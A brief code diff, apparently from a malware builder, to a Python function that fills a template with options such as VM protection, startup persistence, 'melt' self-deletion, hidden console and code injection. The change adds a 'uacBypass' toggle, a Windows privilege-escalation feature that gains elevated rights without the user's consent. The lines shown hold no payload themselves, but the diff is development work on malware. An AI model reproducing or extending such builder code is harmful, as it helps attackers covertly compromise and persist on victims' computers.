@@ -21,6 +21,7 @@ def WriteSettings(code: str, settings: dict, injection: str) -> str:
     code = code.replace('%vmprotect%', "true" if settings["settings"]["vmprotect"] else "")
     code = code.replace('%startup%', "true" if settings["settings"]["startup"] else "")
     code = code.replace('%melt%', "true" if settings["settings"]["melt"] else "")
+    code = code.replace('%uacBypass%', "true" if settings["settings"]["uacBypass"] else "")
     code = code.replace('%hideconsole%', "true" if settings["settings"]["consoleMode"] in (0, 1) else "")
     code = code.replace('%debug%', "true" if settings["settings"]["debug"] else "")
     
